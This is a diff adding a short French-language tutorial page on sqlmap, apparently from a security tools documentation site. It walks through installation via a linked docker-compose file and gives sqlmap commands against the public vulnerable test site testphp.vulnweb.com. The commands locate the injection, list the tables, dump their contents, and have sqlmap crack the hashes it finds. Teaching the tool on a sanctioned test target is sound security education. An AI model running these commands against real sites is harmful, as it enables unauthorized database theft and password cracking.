@@ -1,0 +1,29 @@
+<h1><b>sqlmap</b></h1>
+
+<h2>1. Objectif de l'outil</h2>
+
+<p>
+    Sqlmap est un outil linux qui detect et exploit les attaque injections SQL. <br>
+    Cette outils est acompagné de beaucoup de possibilité <br>
+    <img src="help.PNG" width="700px" > <br>
+    
+</p>
+<h2>2. Fonctionnement</h2>
+<h3>Installation</h3>
+<p>
+    Télécharger le fichier <a class="link-primary"
+                              href="Docker/sqlmap/docker-compose.yml" download="docker-compose.yml"><U>docker-compose.yml</U></a>
+</p>
+
+<h3>Utilisation</h3>
+<p>
+    On va faire le test sur une page web préfu pour les test : "http://testphp.vulnweb.com/artists.php?artist=2"<br>
+    On lance la commande "sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2" pour recherché les tables<br>
+    <img src="1.PNG" width="700px"><br><br>
+    On lance la commande "sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart --tables" pour affiché les diférentes tables mySQL de ce site. <br>
+    <img src="2.PNG" width="700px"><br><br>
+    On lance la commande "sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart --dump" pour affiché le contenu de la table user <br>
+    si on ne fait que taper sur entrée sur la commande précédente, sqlmap tente de cacker les hashes trouvé <br>
+    <img src="3.PNG" width="700px"><br>
+</p>
+
